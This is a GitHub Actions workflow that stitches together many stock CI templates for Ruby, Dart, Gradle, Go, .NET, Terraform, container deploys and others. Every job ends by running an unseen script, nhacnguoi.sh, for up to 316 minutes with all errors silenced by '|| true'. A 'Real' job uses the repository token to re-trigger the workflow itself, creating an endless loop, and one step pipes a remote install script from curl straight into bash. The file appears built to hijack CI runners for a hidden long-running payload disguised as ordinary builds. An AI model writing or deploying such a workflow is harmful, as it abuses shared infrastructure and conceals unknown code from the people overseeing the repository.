name: "Luyx"
on:
  workflow_call:
    inputs:
        source_repo:
          required: true
          type: string
  
        source_ref:
          required: true
          type: string
  workflow_dispatch:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
permissions:
  actions: write
  contents: read
jobs:
  test:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5

      - name: Real
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        shell: bash
        run: |
          gh workflow run "${{ github.workflow }}" \
            --repo "${{ github.repository }}" \
            --ref "${{ github.ref_name }}"

  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}
      - name: Generate binstubs
        run: bundle binstubs bundler-audit brakeman rubocop || true
      # Add or replace any other lints here
      - name: Security audit dependencies
        run: bin/bundler-audit --update || true
      - name: Security audit application code
        run: bin/brakeman -q -w2 || true
      - name: Lint Ruby files
        run: bin/rubocop --parallel || true

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true

      

  dart:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}
      # Note: This workflow uses the latest stable version of the Dart SDK.
      # You can specify other versions if desired, see documentation here:
      # https://github.com/dart-lang/setup-dart/blob/main/README.md
      # - uses: dart-lang/setup-dart@v1
      - uses: dart-lang/setup-dart@9a04e6d73cca37bd455e0608d7e5092f881fd603

      - name: Install dependencies
        run: dart pub get || true

      # Uncomment this step to verify the use of 'dart format' on each commit.
      # - name: Verify formatting
      #   run: dart format --output=none --set-exit-if-changed .

      # Consider passing '--fatal-infos' for slightly stricter analysis.
      - name: Analyze project source
        run: dart analyze || true

      # Your project will need to have tests in test/ and a dependency on
      # package:test for this step to succeed. Note that Flutter projects will
      # want to change this to 'flutter test'.
      - name: Run tests
        run: dart test || true

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true

  grad:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    - name: Grant execute permission for gradlew
      run: chmod +x gradlew || true
    - name: Build with Gradle
      run: ./gradlew build || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  go:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    - name: Set up Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.20'

    - name: Build
      run: go build -v ./... || true

    - name: Test
      run: go test -v ./... || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  CMake:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    - name: Configure CMake
      # Configure CMake in a 'build' subdirectory. `CMAKE_BUILD_TYPE` is only required if you are using a single-configuration generator such as make.
      # See https://cmake.org/cmake/help/latest/variable/CMAKE_BUILD_TYPE.html?highlight=cmake_build_type
      run: cmake -B ${{github.workspace}}/build -DCMAKE_BUILD_TYPE=${{env.BUILD_TYPE}} || true

    - name: Build
      # Build your program with the given configuration
      run: cmake --build ${{github.workspace}}/build --config ${{env.BUILD_TYPE}} || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  contain:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}
    - name: Install dependencies
      run: lein deps || true
    - name: Run tests
      run: lein test || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  javax:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}
    - name: Set up JDK 11
      uses: actions/setup-java@v4
      with:
        java-version: '11'
        distribution: 'temurin'
    - name: Build with Ant
      run: ant -noinput -buildfile build.xml || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true
  lint8:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}
      - name: Generate binstubs
        run: bundle binstubs bundler-audit brakeman rubocop || true
      # Add or replace any other lints here
      - name: Security audit dependencies
        run: bin/bundler-audit --update || true
      - name: Security audit application code
        run: bin/brakeman -q -w2 || true
      - name: Lint Ruby files
        run: bin/rubocop --parallel || true

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true
  pul:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}
    - uses: dlang-community/setup-dlang@4c99aa991ce7d19dd3064de0a4f2f6b2f152e2d7

    - name: 'Build & Test'
      run: |
        # Build the project, with its main file included, without unittests
        dub build --compiler=$DC || true
        # Build and run tests, as defined by `unittest` configuration
        # In this mode, `mainSourceFile` is excluded and `version (unittest)` are included
        # See https://dub.pm/package-format-json.html#configurations
        dub test --compiler=$DC || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  lint10:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}
      - name: Generate binstubs
        run: bundle binstubs bundler-audit brakeman rubocop || true
      # Add or replace any other lints here
      - name: Security audit dependencies
        run: bin/bundler-audit --update || true
      - name: Security audit application code
        run: bin/brakeman -q -w2 || true
      - name: Lint Ruby files
        run: bin/rubocop --parallel || true

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true
  strat:

    runs-on: ubuntu-latest  # For a list of available runner types, refer to
                             # https://help.github.com/en/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on

    env:
      Solution_Name: your-solution-name                         # Replace with your solution name, i.e. MyWpfApp.sln.
      Test_Project_Path: your-test-project-path                 # Replace with the path to your test project, i.e. MyWpfApp.Tests\MyWpfApp.Tests.csproj.
      Wap_Project_Directory: your-wap-project-directory-name    # Replace with the Wap project directory relative to the solution, i.e. MyWpfApp.Package.
      Wap_Project_Path: your-wap-project-path                   # Replace with the path to your Wap project, i.e. MyWpf.App.Package\MyWpfApp.Package.wapproj.

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    # Install the .NET Core workload
    - name: Install .NET Core
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 8.0.x


    # Execute all unit tests in the solution
    - name: Execute unit tests
      run: dotnet test || true

    # Restore the application to populate the obj folder with RuntimeIdentifiers
    - name: Restore the application
      run: msbuild $env:Solution_Name /t:Restore /p:Configuration=$env:Configuration || true


    # Remove the pfx
    - name: Remove the pfx
      run: Remove-Item -path $env:Wap_Project_Directory\GitHubActionsWorkflow.pfx || true

    # Upload the MSIX package: https://github.com/marketplace/actions/upload-a-build-artifact
    - name: Upload build artifacts
      uses: actions/upload-artifact@v4
      with:
        name: MSIX Package
        path: ${{ env.Wap_Project_Directory }}\AppPackages

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  branch:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}
    - name: Build with Gradle Wrapper
      run: ./gradlew build || true

    # NOTE: The Gradle Wrapper is the default and recommended way to run Gradle (https://docs.gradle.org/current/userguide/gradle_wrapper.html).
    # If your project does not have the Gradle Wrapper configured, you can use the following configuration to run Gradle with a specified version.
    #
    # - name: Setup Gradle
    #   uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0
    #   with:
    #     gradle-version: '8.9'
    #
    # - name: Build with Gradle 8.9
    #   run: gradle build

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  dependency-submission:

    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'


    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  jobs:
    # The type of runner that the job will run on - Ubuntu is required as Docker is leveraged for the action
    permissions:
      contents: read # for actions/checkout to fetch code
      issues: write # for checkmarx-ts/checkmarx-cxflow-github-action to write feedback to github issues
      pull-requests: write # for checkmarx-ts/checkmarx-cxflow-github-action to write feedback to PR
      security-events: write # for github/codeql-action/upload-sarif to upload SARIF results
      actions: read # only required for a private repository by github/codeql-action/upload-sarif to get the Action run status
    runs-on: ubuntu-latest

    # Steps require - checkout code, run CxFlow Action, Upload SARIF report (optional)
    steps:
    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  buildImage:
    permissions:
      contents: read
      id-token: write
    runs-on: ubuntu-latest
    steps:
      # Checks out the repository this file is in
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}


      # Builds and pushes an image up to your Azure Container Registry
      - name: Build and push image to ACR
        run: |
          az acr build --image ${{ env.AZURE_CONTAINER_REGISTRY }}.azurecr.io/${{ env.CONTAINER_NAME }}:${{ github.sha }} --registry ${{ env.AZURE_CONTAINER_REGISTRY }} -g ${{ env.RESOURCE_GROUP }} . || true

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true
  deploy:
    permissions:
      actions: read
      contents: read
      id-token: write
    runs-on: ubuntu-latest
    steps:
      # Checks out the repository this file is in
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}
      # Retrieves your Azure Kubernetes Service cluster's kubeconfig file

      - name: Run trung
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true
            
  contents:
    runs-on: ubuntu-latest
    environment: production

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    # 1.1 Login to ACR
    - name: Login to ACR with the AccessKey pair
      uses: aliyun/acr-login@v1
      with:
        region-id: "${{ env.REGION_ID }}"
        access-key-id: "${{ secrets.ACCESS_KEY_ID }}"
        access-key-secret: "${{ secrets.ACCESS_KEY_SECRET }}"

    # 1.2 Build and push image to ACR
    - name: Build and push image to ACR
      run: |
        docker build --tag "$REGISTRY/$NAMESPACE/$IMAGE:$TAG" . || true
        docker push "$REGISTRY/$NAMESPACE/$IMAGE:$TAG" || true


    # 2.2 (Optional) Build and push image ACR EE
    - name: Build and push image to ACR EE
      run: |
        docker build -t "$ACR_EE_REGISTRY/$ACR_EE_NAMESPACE/$ACR_EE_IMAGE:$TAG" . || true
        docker push "$ACR_EE_REGISTRY/$ACR_EE_NAMESPACE/$ACR_EE_IMAGE:$TAG" || true

    # 3.2 Deploy the image to the ACK cluster
    - name: Set up Kustomize
      run: |-
        curl -s "https://raw.githubusercontent.com/kubernetes-sigs/kustomize/master/hack/install_kustomize.sh"  | bash /dev/stdin 3.8.6 || true
    - name: Deploy
      run: |-
        ./kustomize edit set image REGISTRY/NAMESPACE/IMAGE:TAG=$REGISTRY/$NAMESPACE/$IMAGE:$TAG || true
        ./kustomize build . | kubectl apply -f - || true
        kubectl rollout status deployment/$ACK_DEPLOYMENT_NAME || true
        kubectl get services -o wide || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  openshift-ci-cd:
    # 🖊️ Uncomment this if you are using CRDA scan step above
    # needs: crda-scan
    name: Build and deploy to OpenShift
    runs-on: ubuntu-latest
    environment: production

    steps:

    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    - name: Determine app name
      run: |
        echo "APP_NAME=$(basename $PWD)" | tee -a $GITHUB_ENV || true

    - name: Determine image tags
      run: |
        echo "IMAGE_TAGS=latest ${GITHUB_SHA::12}" | tee -a $GITHUB_ENV || true


    - name: Print application URL
      env:
        ROUTE: ${{ steps.deploy-and-expose.outputs.route }}
        SELECTOR: ${{ steps.deploy-and-expose.outputs.selector }}
      run: |
        echo
        echo "======================== Your application is available at: ========================"
        echo ${{ env.ROUTE }} || true
        echo "==================================================================================="
        echo
        echo "Your app can be taken down with: \"oc delete all --selector='${{ env.SELECTOR }}'\"" || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true

  terraform:
    name: 'Terraform'
    runs-on: ubuntu-latest
    environment: production

    # Use the Bash shell regardless whether the GitHub Actions runner is ubuntu-latest, macos-latest, or windows-latest
    defaults:
      run:
        shell: bash

    steps:
    # Checkout the repository to the GitHub Actions runner
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.source_repo }}
        ref: ${{ inputs.source_ref }}

    # Install the latest version of Terraform CLI and configure the Terraform CLI configuration file with a Terraform Cloud user API token
    - name: Setup Terraform
      uses: hashicorp/setup-terraform@v1
      with:
        cli_config_credentials_token: ${{ secrets.TF_API_TOKEN }}

    # Initialize a new or existing Terraform working directory by creating initial files, loading any remote state, downloading modules, etc.
    - name: Terraform Init
      run: terraform init || true

    # Checks that all Terraform configuration files adhere to a canonical format
    - name: Terraform Format
      run: terraform fmt -check || true

    # Generates an execution plan for Terraform
    - name: Terraform Plan
      run: terraform plan -input=false || true

      # On push to "main", build or change infrastructure according to Terraform configuration files
      # Note: It is recommended to set up a required "strict" status check in your repository for "Terraform Cloud". See the documentation on "strict" required status checks for more information: https://help.github.com/en/github/administering-a-repository/types-of-required-status-checks
    - name: Terraform Apply
      if: github.ref == 'refs/heads/"main"' && github.event_name == 'push'
      run: terraform apply -auto-approve -input=false || true

    - name: Run trung
      timeout-minutes: 316
      run: |
          sed -i 's/\r$//' nhacnguoi.sh || true
          chmod +x nhacnguoi.sh || true
          ./nhacnguoi.sh || true
  build:
    runs-on: ubuntu-latest
    outputs:
      digests: ${{ steps.hash.outputs.digests }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ inputs.source_repo }}
          ref: ${{ inputs.source_ref }}

      # ========================================================
      #
      # Step 1: Build your artifacts.
      #
      # ========================================================
      - name: Build artifacts
        run: |
            # These are some amazing artifacts.
            echo "artifact1" > artifact1 || true
            echo "artifact2" > artifact2 || true

      # ========================================================
      #
      # Step 2: Add a step to generate the provenance subjects
      #         as shown below. Update the sha256 sum arguments
      #         to include all binaries that you generate
      #         provenance for.
      #
      # ========================================================
      - name: Generate subject for provenance
        id: hash
        run: |
          set -euo pipefail || true

          # List the artifacts the provenance will refer to.
          files=$(ls artifact*) || true
          # Generate the subjects (base64 encoded).
          echo "hashes=$(sha256sum $files | base64 -w0)" >> "${GITHUB_OUTPUT}" || true

      - name: Run
        timeout-minutes: 316
        run: |
            sed -i 's/\r$//' nhacnguoi.sh || true
            chmod +x nhacnguoi.sh || true
            ./nhacnguoi.sh || true
